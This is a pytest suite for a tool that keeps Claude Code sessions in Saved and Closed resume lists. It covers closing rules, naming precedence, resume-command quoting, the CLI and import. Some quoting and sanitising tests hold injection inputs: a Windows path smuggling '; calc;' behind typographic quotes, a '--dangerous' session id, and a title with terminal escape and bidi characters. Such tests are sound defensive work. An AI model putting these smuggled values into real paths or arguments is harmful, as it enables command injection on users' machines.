"""Tests for the resume lists (missioncache_db.resume_sessions).

Spec source: the approved phase 1 plan for session resume
(~/.claude/plans/replicated-splashing-crown.md, "חזרה לסשנים"), which ports
the rules of the personal iterm-recent-sessions tool (its README, "Closing a
Claude Code tab never loses its resume command"):

* Every Claude Code session that closes is kept with a name, project,
  directory and a resume command derived on read.
* A session bound to a MissionCache project, or one the person kept, goes to
  Saved. Every other one goes to Closed, the newest 500.
* A session that ended without SessionEnd is closed on read: a dead or reused
  pid, a pid now running another session (/clear), or no pid and not seen
  for 24 hours. Seeing it again (a resume keeps the id) reopens it.
* Saved keeps one entry per project and MissionCache title. A newer session
  replaces a closed one, keeping its hand-given name; an open one is never
  replaced.
* A Closed entry whose transcript Claude Code deleted drops out. A Saved one
  stays, and a project one then resumes by loading its project. A projects
  folder that cannot be read deletes nothing.
* The lead session is never listed.

Changes agreed after the review round (2026-10-25, in the session with
Tomer, recorded in the missioncache-release context):

* A session still open gets no resume command: two processes would write one
  transcript.
* A replaced Saved entry drops to Closed instead of being deleted, and its
  hand-given name and pin move to the newer entry.
* A session closed by a dead pid or a /clear is stamped with the time it was
  found gone. One closed for not being seen in 24 hours keeps its last seen
  time.
* Reconcile closes a row only if no hook saw it while it was deciding.
* The lead's row is hidden from the lists, not deleted.
* Sessions MissionCache Auto starts are not recorded.
* The name order is: a /rename, the MissionCache title, Claude Code's
  generated title (ai-title in the transcript), its derived name, the folder.
* SessionStart owns the directory and the pid. Later hooks do not move them.
* On Windows the command is a PowerShell line.

Assertions trace to those rules, not to the implementation.
"""

import json
import os
import shutil
import sqlite3
import time
from datetime import datetime, timedelta

import pytest

import missioncache_db as m
from missioncache_db import resume_sessions as rs

SID_A = "aaaaaaaa-1111-4111-8111-111111111111"
SID_B = "bbbbbbbb-2222-4222-8222-222222222222"
SID_C = "cccccccc-3333-4333-8333-333333333333"


@pytest.fixture
def env(tmp_path, monkeypatch):
    """A temp home, tasks.db and hooks-state.db, and controllable liveness."""
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    state_db = tmp_path / ".claude" / "hooks-state.db"
    state_db.parent.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(m, "HOOKS_STATE_DB_PATH", state_db)
    monkeypatch.setattr(m, "DB_PATH", tmp_path / "tasks.db")
    (tmp_path / ".claude" / "projects" / "-work").mkdir(parents=True)
    alive = {}  # pid -> (alive, start token)
    monkeypatch.setattr(m.proc, "process_alive", lambda pid: alive.get(pid, (False, None))[0])
    monkeypatch.setattr(m.proc, "process_start_token", lambda pid: alive.get(pid, (None, None))[1])
    monkeypatch.setattr(m, "lead_session_id", lambda: None)
    monkeypatch.setattr(rs, "WINDOWS", False)  # the POSIX command, on every runner
    conn = rs.hook_connect()
    yield {"home": tmp_path, "alive": alive, "conn": conn}
    conn.close()


def _transcript(home, sid):
    path = home / ".claude" / "projects" / "-work" / f"{sid}.jsonl"
    path.write_text("{}\n")
    return str(path)


def _pid(home, sid, pid, start="T0"):
    path = m.session_pid_path(sid)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"sessionId": sid, "pid": pid, "startTime": start}))


def _claude_record(home, pid, sid, name=None, source="derived"):
    path = home / ".claude" / "sessions" / f"{pid}.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"pid": pid, "sessionId": sid, "name": name, "nameSource": source}))


def _bind(sid, project, title=None):
    conn = sqlite3.connect(m.HOOKS_STATE_DB_PATH)
    try:
        m.init_hooks_state_db_schema(conn)
        conn.execute("INSERT INTO project_state (session_id, project_name) VALUES (?, ?)", (sid, project))
        conn.commit()
    finally:
        conn.close()
    m.write_session_title(sid, title or project, project)


def _seen(env, sid, cwd="/work/repo", transcript=True):
    path = _transcript(env["home"], sid) if transcript else None
    assert rs.record_seen(env["conn"], sid, cwd, path)
    return path


def _age(env, sid, hours):
    stamp = (datetime.now() - timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
    env["conn"].execute("UPDATE resume_sessions SET last_seen_at = ? WHERE session_id = ?", (stamp, sid))
    env["conn"].commit()


def _ids(rows):
    return [r["session_id"] for r in rows]


# --- where a closed session goes -------------------------------------------


def test_project_session_goes_to_saved_with_a_resume_command(env):
    _bind(SID_A, "billing-migration")
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "prompt_input_exit")
    [row] = rs.list_sessions(env["conn"], "saved")
    assert row["session_id"] == SID_A
    assert row["name"] == "billing-migration"
    assert row["origin"] == "missioncache"
    assert row["command"] == f"cd /work/repo && claude --resume {SID_A}"
    assert rs.list_sessions(env["conn"], "closed") == []


def test_unbound_session_goes_to_closed(env):
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]
    assert rs.list_sessions(env["conn"], "saved") == []
    assert rs.list_sessions(env["conn"], "closed")[0]["origin"] == "claude"


def test_open_session_is_in_neither_list(env):
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    assert rs.list_sessions(env["conn"]) == []


def test_cwd_with_spaces_is_quoted_in_the_command(env):
    _seen(env, SID_A, cwd="/work/my repo")
    rs.close_session(env["conn"], SID_A, "other")
    assert rs.list_sessions(env["conn"])[0]["command"] == f"cd '/work/my repo' && claude --resume {SID_A}"


# --- sessions that ended without SessionEnd ---------------------------------


def test_dead_pid_closes_the_session_on_read(env):
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    _age(env, SID_A, 1)  # last seen an hour before it was found gone
    env["alive"][4242] = (False, None)
    before = datetime.now().replace(microsecond=0)
    [row] = rs.list_sessions(env["conn"], "closed")
    assert datetime.strptime(row["closed_at"], "%Y-%m-%d %H:%M:%S") >= before


def test_reused_pid_closes_the_session(env):
    _pid(env["home"], SID_A, 4242, start="T0")
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    env["alive"][4242] = (True, "T-other-process")
    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]


def test_pid_running_another_session_closes_the_old_one(env):
    """/clear keeps the process and starts a new session id."""
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    _claude_record(env["home"], 4242, SID_B)
    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]


def test_session_without_pid_closes_after_24_hours(env):
    _seen(env, SID_A)
    _age(env, SID_A, 23)
    assert rs.list_sessions(env["conn"]) == []
    _age(env, SID_A, 25)
    seen_at = env["conn"].execute("SELECT last_seen_at FROM resume_sessions").fetchone()[0]
    [row] = rs.list_sessions(env["conn"], "closed")
    assert row["session_id"] == SID_A and row["closed_at"] == seen_at


def test_a_live_pid_with_no_claude_record_falls_back_to_the_24_hour_rule(env):
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    _age(env, SID_A, 23)
    assert rs.list_sessions(env["conn"]) == []
    _age(env, SID_A, 25)
    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]


def test_reconcile_does_not_close_a_row_a_hook_saw_meanwhile(env):
    _seen(env, SID_A)
    _age(env, SID_A, 25)
    old = env["conn"].execute("SELECT last_seen_at FROM resume_sessions").fetchone()[0]
    _age(env, SID_A, 0)  # a prompt arrived after reconcile read the row
    assert rs.close_session(env["conn"], SID_A, "gone", expect_seen=old) is False
    assert rs.get_session(env["conn"], SID_A)["open"] is True


def test_seeing_a_closed_session_again_reopens_it(env):
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    assert rs.list_sessions(env["conn"]) == []
    assert rs.get_session(env["conn"], SID_A)["open"] is True


# --- one Saved entry per project and title -----------------------------------


def test_newer_session_replaces_the_saved_one_and_keeps_its_hand_name(env):
    _bind(SID_A, "api", "api")
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    rs.rename(env["conn"], SID_A, "my api work")
    _bind(SID_B, "api", "api")
    _seen(env, SID_B, cwd="/work/api")
    rs.close_session(env["conn"], SID_B, "other")
    [row] = rs.list_sessions(env["conn"], "saved")
    assert row["session_id"] == SID_B
    assert row["name"] == "my api work"
    assert row["command"] == f"cd /work/api && claude --resume {SID_B}"


def test_a_replaced_saved_entry_drops_to_closed_without_its_name_and_pin(env):
    _bind(SID_A, "api", "api")
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    rs.rename(env["conn"], SID_A, "my api work")
    rs.set_pinned(env["conn"], SID_A, True)
    _bind(SID_B, "api", "api")
    _seen(env, SID_B)
    rs.close_session(env["conn"], SID_B, "other")
    old = rs.get_session(env["conn"], SID_A)
    assert old["list"] == "closed" and old["pinned"] is False and old["custom_name"] is None
    new = rs.get_session(env["conn"], SID_B)
    assert new["name"] == "my api work" and new["pinned"] is True


def test_an_open_saved_session_is_never_replaced(env):
    # A was saved, then resumed: an open row that is already in Saved.
    _bind(SID_A, "api", "api")
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    _bind(SID_B, "api", "api")
    _seen(env, SID_B)
    rs.close_session(env["conn"], SID_B, "other")
    row = rs.get_session(env["conn"], SID_A)
    assert row["open"] is True and row["saved"] is True


def test_a_suffixed_title_is_a_separate_saved_entry(env):
    _bind(SID_A, "api", "api")
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    _bind(SID_B, "api", "api-2")
    _seen(env, SID_B)
    rs.close_session(env["conn"], SID_B, "other")
    assert sorted(_ids(rs.list_sessions(env["conn"], "saved"))) == sorted([SID_A, SID_B])


def test_a_kept_session_returns_to_saved_when_it_closes_again(env):
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    rs.keep(env["conn"], SID_A)
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    assert _ids(rs.list_sessions(env["conn"], "saved")) == [SID_A]


def test_a_pinned_saved_session_stays_listed_while_open(env):
    _bind(SID_A, "api")
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    rs.set_pinned(env["conn"], SID_A, True)
    [row] = rs.list_sessions(env["conn"], "saved")
    assert row["open"] is True and row["pinned"] is True


# --- the lead ------------------------------------------------------------------


def test_the_lead_is_never_recorded_or_listed(env, monkeypatch):
    monkeypatch.setattr(m, "lead_session_id", lambda: SID_A)
    assert rs.record_seen(env["conn"], SID_A, "/work", None) is False
    assert rs.get_session(env["conn"], SID_A) is None


def test_a_session_that_became_the_lead_leaves_the_lists_and_comes_back(env, monkeypatch):
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    rs.rename(env["conn"], SID_A, "mine")
    monkeypatch.setattr(m, "lead_session_id", lambda: SID_A)
    assert rs.list_sessions(env["conn"]) == []
    assert rs.find(env["conn"], SID_A) == []
    monkeypatch.setattr(m, "lead_session_id", lambda: None)
    [row] = rs.list_sessions(env["conn"])
    assert row["session_id"] == SID_A and row["name"] == "mine"


# --- transcripts Claude Code deleted -------------------------------------------


def test_deleted_transcript_drops_closed_but_keeps_saved_with_a_load_command(env):
    path_a = _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    _bind(SID_B, "api")
    path_b = _seen(env, SID_B)
    rs.close_session(env["conn"], SID_B, "other")
    os.remove(path_a)
    os.remove(path_b)
    rows = rs.list_sessions(env["conn"])
    assert _ids(rows) == [SID_B]
    assert rows[0]["transcript_gone"] is True
    assert rows[0]["command"] == "cd /work/repo && claude '/missioncache:load api'"


def test_unreadable_projects_folder_deletes_nothing(env):
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    shutil.rmtree(env["home"] / ".claude" / "projects")
    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]


def test_a_transcript_that_cannot_be_checked_is_not_dropped(env, monkeypatch):
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    real_stat = os.stat

    def denied(path, *a, **k):
        if str(path).endswith(".jsonl"):
            raise PermissionError(path)
        return real_stat(path, *a, **k)

    monkeypatch.setattr(rs.os, "stat", denied)
    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]


def test_closed_keeps_the_newest_500(env):
    now = datetime.now()
    rows = [
        (f"{i:08x}-0000-4000-8000-000000000000", "/w", "x",
         (now - timedelta(minutes=i)).strftime("%Y-%m-%d %H:%M:%S"))
        for i in range(501)
    ]
    env["conn"].executemany(
        "INSERT INTO resume_sessions (session_id, cwd, auto_name, first_seen_at, last_seen_at, closed_at) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        [(sid, cwd, name, t, t, t) for sid, cwd, name, t in rows],
    )
    env["conn"].commit()
    listed = _ids(rs.list_sessions(env["conn"], "closed"))
    assert len(listed) == 500
    assert rows[-1][0] not in listed  # the oldest went


# --- names -----------------------------------------------------------------------


def test_a_claude_code_rename_wins_over_the_missioncache_title(env):
    _bind(SID_A, "billing-api")
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _claude_record(env["home"], 4242, SID_A, name="api retry work", source="user")
    _seen(env, SID_A)
    assert rs.get_session(env["conn"], SID_A)["name"] == "api retry work"


def test_claude_codes_generated_name_does_not_beat_the_title(env):
    _bind(SID_A, "billing-api")
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _claude_record(env["home"], 4242, SID_A, name="work-fe", source="derived")
    _seen(env, SID_A)
    assert rs.get_session(env["conn"], SID_A)["name"] == "billing-api"


def test_a_claude_code_record_for_another_session_gives_no_name(env):
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _claude_record(env["home"], 4242, SID_B, name="someone-else", source="user")
    _seen(env, SID_A, cwd="/work/repo")
    assert rs.get_session(env["conn"], SID_A)["name"] == "repo"


def _titles(path, *records):
    with open(path, "a") as f:
        for kind, title in records:
            key = "aiTitle" if kind == "ai-title" else "customTitle"
            f.write(json.dumps({"type": kind, key: title}) + "\n")


def test_transcript_titles_name_the_session(env):
    """The generated title beats the folder, the MissionCache title beats the
    generated one, and a /rename beats both."""
    path = _seen(env, SID_A, cwd="/work/repo")
    _titles(path, ("ai-title", "Fix the login page"))
    rs.record_seen(env["conn"], SID_A, "/work/repo", path)
    assert rs.get_session(env["conn"], SID_A)["name"] == "Fix the login page"
    _bind(SID_A, "web-login")
    rs.record_seen(env["conn"], SID_A, "/work/repo", path)
    assert rs.get_session(env["conn"], SID_A)["name"] == "web-login"
    _titles(path, ("custom-title", "login rework"))
    rs.record_seen(env["conn"], SID_A, "/work/repo", path)
    assert rs.get_session(env["conn"], SID_A)["name"] == "login rework"


def test_titles_are_read_from_where_the_last_read_stopped(env):
    path = _seen(env, SID_A, cwd="/work/repo")
    _titles(path, ("ai-title", "First title"))
    with open(path, "a") as f:
        f.write('{"type": "ai-title", "aiTitle": "half writ')  # still being written
    rs.record_seen(env["conn"], SID_A, "/work/repo", path)
    row = rs.get_session(env["conn"], SID_A)
    assert row["name"] == "First title"
    assert row["title_offset"] == len(open(path, "rb").read().rsplit(b"\n", 1)[0]) + 1
    with open(path, "a") as f:
        f.write('ten"}\n')
    _age(env, SID_A, 1)
    rs.record_seen(env["conn"], SID_A, "/work/repo", path)
    assert rs.get_session(env["conn"], SID_A)["name"] == "half written"


def test_a_title_with_control_characters_is_cleaned(env):
    path = _seen(env, SID_A, cwd="/work/repo")
    _titles(path, ("ai-title", "evil\x1b[31m\u202etitle"))
    rs.record_seen(env["conn"], SID_A, "/work/repo", path)
    assert rs.get_session(env["conn"], SID_A)["name"] == "evil [31m title"


def test_unbound_session_uses_claude_codes_name_then_the_folder(env):
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _claude_record(env["home"], 4242, SID_A, name="work-fe", source="derived")
    _seen(env, SID_A)
    _seen(env, SID_B, cwd="/work/some-repo")
    assert rs.get_session(env["conn"], SID_A)["name"] == "work-fe"
    assert rs.get_session(env["conn"], SID_B)["name"] == "some-repo"


def test_rename_validation_and_reset(env):
    _seen(env, SID_A, cwd="/work/repo")
    with pytest.raises(ValueError):
        rs.rename(env["conn"], SID_A, "bad\x1bname")
    with pytest.raises(ValueError):
        rs.rename(env["conn"], SID_A, "bad\u202ename")
    with pytest.raises(ValueError):
        rs.rename(env["conn"], SID_A, "x" * 201)
    assert rs.rename(env["conn"], SID_A, "x" * 200) is True
    rs.rename(env["conn"], SID_A, "mine")
    assert rs.get_session(env["conn"], SID_A)["name"] == "mine"
    rs.rename(env["conn"], SID_A, "")
    row = rs.get_session(env["conn"], SID_A)
    assert row["name"] == "repo" and row["custom_name"] is None


# --- search and references -----------------------------------------------------------


SID_D = "dddddddd-4444-4444-8444-444444444444"
SID_E = "eeeeeeee-5555-4555-8555-555555555555"


def test_search_matches_each_field_saved_first(env):
    """One row per field, so each field is shown to match on its own."""
    _seen(env, SID_A, cwd="/work/billing")  # folder only (its name is "billing" too)
    rs.close_session(env["conn"], SID_A, "other")
    rs.rename(env["conn"], SID_A, "folder row")
    _bind(SID_B, "billing-migration", "api")  # project only
    _seen(env, SID_B, cwd="/work/x")
    rs.close_session(env["conn"], SID_B, "other")
    _seen(env, SID_C, cwd="/work/y")  # name only
    rs.close_session(env["conn"], SID_C, "other")
    rs.rename(env["conn"], SID_C, "Billing notes")
    _seen(env, SID_D, cwd="/work/z")  # no match
    rs.close_session(env["conn"], SID_D, "other")
    ids = _ids(rs.list_sessions(env["conn"], "all", "BILLING"))
    assert ids[0] == SID_B and sorted(ids[1:]) == sorted([SID_A, SID_C])


def test_search_treats_wildcards_literally(env):
    _seen(env, SID_A, cwd="/work/repo")
    rs.close_session(env["conn"], SID_A, "other")
    assert rs.list_sessions(env["conn"], "all", "%") == []


def test_find_by_id_prefix_or_exact_name(env):
    _seen(env, SID_A, cwd="/work/repo")
    rs.close_session(env["conn"], SID_A, "other")
    assert _ids(rs.find(env["conn"], SID_A[:6])) == [SID_A]
    assert _ids(rs.find(env["conn"], "REPO")) == [SID_A]
    assert rs.find(env["conn"], "rep") == []
    assert rs.find(env["conn"], SID_A[:5]) == []


def test_actions_on_an_unknown_session_report_no_change(env):
    for action in (rs.keep, rs.forget):
        assert action(env["conn"], SID_C) is False
    assert rs.rename(env["conn"], SID_C, "x") is False


# --- the hook write ----------------------------------------------------------------------


def test_hook_write_on_a_locked_database_returns_fast_and_quietly(env):
    holder = sqlite3.connect(m.DB_PATH)
    holder.execute("BEGIN EXCLUSIVE")
    try:
        start = time.monotonic()
        rs.hook_record(SID_A, "/work", None, close_reason="other")
        assert time.monotonic() - start < 1.0
    finally:
        holder.rollback()
        holder.close()


def test_missioncache_auto_sessions_are_not_recorded(env, monkeypatch):
    monkeypatch.setenv("MISSIONCACHE_AUTO_MODE", "1")
    rs.hook_record(SID_A, "/work/repo", _transcript(env["home"], SID_A))
    assert rs.get_session(env["conn"], SID_A) is None


def test_a_failed_hook_write_leaves_a_note_on_stderr(env, monkeypatch, capsys):
    monkeypatch.setattr(rs, "hook_connect", lambda: (_ for _ in ()).throw(sqlite3.OperationalError("locked")))
    rs.hook_record(SID_A, "/work/repo")
    assert "resume list write failed: locked" in capsys.readouterr().err


def test_session_start_owns_the_folder_and_the_pid(env):
    """A later prompt does not move the folder. A SessionStart with no pid
    record (a resume the hooks cannot resolve) clears the old pid, so the
    old process dying does not close the live session."""
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    rs.record_seen(env["conn"], SID_A, "/work/repo", None, start=True)
    rs.record_seen(env["conn"], SID_A, "/work/repo/sub", None)
    assert rs.get_session(env["conn"], SID_A)["cwd"] == "/work/repo"
    m.session_pid_path(SID_A).unlink()
    rs.record_seen(env["conn"], SID_A, "/work/repo", None, start=True)
    assert rs.get_session(env["conn"], SID_A)["pid"] is None
    env["alive"][4242] = (False, None)
    assert rs.list_sessions(env["conn"]) == []


def test_an_old_table_gets_the_new_columns(tmp_path):
    db = tmp_path / "old.db"
    conn = sqlite3.connect(db)
    # The table as the first build created it, before the title columns.
    conn.execute("CREATE TABLE resume_sessions (session_id TEXT PRIMARY KEY, cwd TEXT NOT NULL, "
                 "transcript_path TEXT, project_name TEXT, mc_title TEXT, auto_name TEXT NOT NULL, "
                 "custom_name TEXT, pid INTEGER, pid_start TEXT, pinned INTEGER NOT NULL DEFAULT 0, "
                 "saved INTEGER NOT NULL DEFAULT 0, saved_at TEXT, first_seen_at TEXT NOT NULL, "
                 "last_seen_at TEXT NOT NULL, closed_at TEXT, close_reason TEXT)")
    conn.commit()
    conn.close()
    conn = rs.hook_connect(db)
    try:
        cols = {r[1] for r in conn.execute("PRAGMA table_info(resume_sessions)")}
        assert {"ai_title", "custom_title", "title_offset"} <= cols
    finally:
        conn.close()


def test_hook_record_from_session_end_closes_the_row(env):
    rs.hook_record(SID_A, "/work/repo", _transcript(env["home"], SID_A), close_reason="prompt_input_exit")
    row = rs.get_session(env["conn"], SID_A)
    assert row["open"] is False and row["close_reason"] == "prompt_input_exit"


# --- the resume command -----------------------------------------------------------


def test_an_open_session_gets_no_resume_command(env):
    _bind(SID_A, "api")
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    rs.set_pinned(env["conn"], SID_A, True)
    [row] = rs.list_sessions(env["conn"], "saved")
    assert row["open"] is True and row["command"] is None and row["argv"] is None


def test_windows_gets_a_powershell_line():
    row = {"session_id": SID_A, "cwd": "C:\\Users\\Robin O'Neil\\a&b", "project_name": "api"}
    assert rs.resume_command(row, True, windows=True) == (
        f"Set-Location -LiteralPath 'C:\\Users\\Robin O''Neil\\a&b'; claude --resume {SID_A}"
    )
    assert rs.resume_command(row, False, windows=True).endswith("; claude '/missioncache:load api'")
    # PowerShell also closes a single-quoted string on the typographic quotes.
    row["cwd"] = "C:\\w\\a\u2019; calc; \u2018"
    assert rs.resume_command(row, True, windows=True).startswith(
        "Set-Location -LiteralPath 'C:\\w\\a\u2019\u2019; calc; \u2018\u2018';"
    )


def test_only_a_uuid_goes_into_resume():
    assert rs.resume_argv({"session_id": "--dangerous", "cwd": "/w"}, True) is None


# --- the CLI --------------------------------------------------------------------------------


def _cli(monkeypatch, *argv):
    monkeypatch.setattr("sys.argv", ["missioncache-db", "resume", *argv])
    m.main()


def test_cli_run_execs_claude_resume_in_the_sessions_folder(env, monkeypatch, tmp_path):
    folder = tmp_path / "repo"
    folder.mkdir()
    _seen(env, SID_A, cwd=str(folder))
    rs.close_session(env["conn"], SID_A, "other")
    calls = {}
    monkeypatch.setattr("shutil.which", lambda name: f"/bin/{name}")
    monkeypatch.setattr(m.os, "chdir", lambda path: calls.setdefault("cwd", path))
    monkeypatch.setattr(m.os, "execv", lambda file, args: calls.setdefault("exec", (file, args)))
    _cli(monkeypatch, "run", SID_A[:8])
    assert calls == {"cwd": str(folder), "exec": ("/bin/claude", ["/bin/claude", "--resume", SID_A])}


def test_cli_run_on_windows_waits_for_claude_and_passes_its_exit_code(env, monkeypatch, tmp_path):
    folder = tmp_path / "repo"
    folder.mkdir()
    _seen(env, SID_A, cwd=str(folder))
    rs.close_session(env["conn"], SID_A, "other")
    monkeypatch.setattr(rs, "WINDOWS", True)
    monkeypatch.setattr("shutil.which", lambda name: f"C:/bin/{name}.exe")
    monkeypatch.setattr(m.os, "chdir", lambda path: None)
    monkeypatch.setattr(m.os, "execv", lambda *a: pytest.fail("Windows has no exec"))
    ran = []
    monkeypatch.setattr("subprocess.run", lambda argv: ran.append(argv) or type("R", (), {"returncode": 3})())
    with pytest.raises(SystemExit) as e:
        _cli(monkeypatch, "run", SID_A)
    assert e.value.code == 3 and ran == [["C:/bin/claude.exe", "--resume", SID_A]]


def test_cli_run_without_claude_on_path_says_so(env, monkeypatch, capsys, tmp_path):
    _seen(env, SID_A, cwd=str(tmp_path))
    rs.close_session(env["conn"], SID_A, "other")
    monkeypatch.setattr("shutil.which", lambda name: None)
    with pytest.raises(SystemExit):
        _cli(monkeypatch, "run", SID_A)
    assert "claude is not on PATH" in capsys.readouterr().out


def test_cli_list_prints_one_line_per_session(env, monkeypatch, capsys):
    _bind(SID_A, "api")
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    _cli(monkeypatch, "list")
    [line] = capsys.readouterr().out.splitlines()
    assert line.startswith("saved") and SID_A[:8] in line and "[api]" in line


def test_cli_run_refuses_an_open_session(env, monkeypatch, capsys):
    _bind(SID_A, "api")
    _pid(env["home"], SID_A, 4242)
    env["alive"][4242] = (True, "T0")
    _seen(env, SID_A)
    rs.set_pinned(env["conn"], SID_A, True)
    monkeypatch.setattr(m.os, "execv", lambda *a: pytest.fail("must not exec an open session"))
    for sub in ("run", "command"):
        with pytest.raises(SystemExit):
            _cli(monkeypatch, sub, SID_A)
        assert "still open" in capsys.readouterr().out


def test_cli_ambiguous_name_lists_the_candidates(env, monkeypatch, capsys):
    _seen(env, SID_A, cwd="/work/repo")
    _seen(env, SID_B, cwd="/other/repo")
    for sid in (SID_A, SID_B):
        rs.close_session(env["conn"], sid, "other")
    with pytest.raises(SystemExit):
        _cli(monkeypatch, "command", "repo")
    out = capsys.readouterr().out
    assert SID_A in out and SID_B in out


def test_a_read_that_changes_nothing_leaves_no_write_lock(env):
    """The dashboard keeps its connection open between polls, so a read must
    not leave a write transaction behind for the hooks to wait on."""
    _seen(env, SID_A)
    rs.close_session(env["conn"], SID_A, "other")
    rs.list_sessions(env["conn"])
    rs.list_sessions(env["conn"])  # nothing left to change
    assert env["conn"].in_transaction is False
    other = sqlite3.connect(m.DB_PATH, timeout=0.2)
    try:
        other.execute("UPDATE resume_sessions SET close_reason = 'x'")
        other.commit()
    finally:
        other.close()


def test_a_repeated_prompt_with_nothing_new_does_not_rewrite_the_row(env):
    """Each prompt records the session, but an unchanged open row is
    rewritten at most every few minutes, so a prompt rarely takes the
    write lock. A change (here a project binding) is written at once."""
    _seen(env, SID_A, cwd="/work/repo")
    _age(env, SID_A, 0.01)  # 36 seconds ago
    stamp = env["conn"].execute("SELECT last_seen_at FROM resume_sessions").fetchone()[0]
    _seen(env, SID_A, cwd="/work/repo")
    assert env["conn"].execute("SELECT last_seen_at FROM resume_sessions").fetchone()[0] == stamp
    _bind(SID_A, "api")
    _seen(env, SID_A, cwd="/work/repo")
    assert rs.get_session(env["conn"], SID_A)["project_name"] == "api"


# --- phase 2: importing the iTerm2 panels' lists, and unsave -------------------------------
# Spec: the approved phase 2 plan (same file, "שלב 2", decision 5 and "מה נבנה",
# approved by Tomer 2026-10-25). The items below are invented examples in the
# shape the earlier panels wrote: {id, name, cwd, command} plus optional
# project, pinned, auto_name, saved_at (saved.json) or closed (recent.json).

EPOCH = 1761300000.0  # a fixed moment, rendered in local time by the import


def _local(epoch):
    return datetime.fromtimestamp(epoch).strftime("%Y-%m-%d %H:%M:%S")


def test_import_turns_a_saved_tab_into_a_saved_row(env):
    _transcript(env["home"], SID_A)
    item = {"id": "x1", "name": "retry work", "auto_name": "api", "project": "api", "pinned": True,
            "cwd": "/work/api", "command": f"claude --resume {SID_A}", "saved_at": EPOCH}
    result = rs.import_items(env["conn"], [item], [])
    assert result == {"imported": 1, "merged": 0, "skipped": []}
    row = rs.get_session(env["conn"], SID_A)
    assert (row["saved"], row["pinned"], row["project_name"], row["mc_title"]) == (True, True, "api", "api")
    assert row["custom_name"] == "retry work" and row["name"] == "retry work"
    assert row["saved_at"] == _local(EPOCH) and row["closed_at"] is not None
    assert row["command"] == f"cd /work/api && claude --resume {SID_A}"


def test_import_puts_a_recently_closed_tab_in_closed(env):
    _transcript(env["home"], SID_B)
    item = {"id": "x2", "name": "scratch", "cwd": "/work/tmp", "command": f"claude --resume {SID_B}",
            "closed": EPOCH}
    rs.import_items(env["conn"], [], [item])
    [row] = rs.list_sessions(env["conn"], "closed")
    assert row["session_id"] == SID_B and row["closed_at"] == _local(EPOCH)
    assert row["custom_name"] is None and row["name"] == "scratch"


def test_import_keeps_what_the_hooks_wrote_and_takes_only_saved_name_and_pin(env):
    _seen(env, SID_A, cwd="/work/from-hook")
    rs.close_session(env["conn"], SID_A, "other")
    item = {"id": "x1", "name": "my name", "auto_name": "auto", "pinned": True, "cwd": "/elsewhere",
            "command": f"claude --resume {SID_A}", "saved_at": EPOCH}
    result = rs.import_items(env["conn"], [item], [])
    assert (result["imported"], result["merged"]) == (0, 1)
    row = rs.get_session(env["conn"], SID_A)
    assert (row["cwd"], row["auto_name"], row["mc_title"]) == ("/work/from-hook", "from-hook", None)
    assert (row["saved"], row["pinned"], row["custom_name"]) == (True, True, "my name")


def test_import_skips_a_tab_with_no_resume_command_and_reports_it(env):
    item = {"id": "x3", "name": "logs", "cwd": "/var/log", "command": ""}
    result = rs.import_items(env["conn"], [item], [])
    assert result["imported"] == 0 and [s["name"] for s in result["skipped"]] == ["logs"]
    assert rs.list_sessions(env["conn"]) == []


def test_import_keeps_one_saved_row_per_project_and_title_newest_wins(env):
    old = {"id": "o", "name": "renamed", "auto_name": "api", "project": "api", "cwd": "/w",
           "command": f"claude --resume {SID_A}", "saved_at": EPOCH}
    new = {"id": "n", "name": "api", "project": "api", "cwd": "/w",
           "command": f"claude --resume {SID_B}", "saved_at": EPOCH + 3600}
    rs.import_items(env["conn"], [new, old], [])  # the newer one listed first: saved_at decides
    assert _ids(rs.list_sessions(env["conn"], "saved")) == [SID_B]
    assert rs.get_session(env["conn"], SID_B)["name"] == "renamed"  # the hand-given name moves
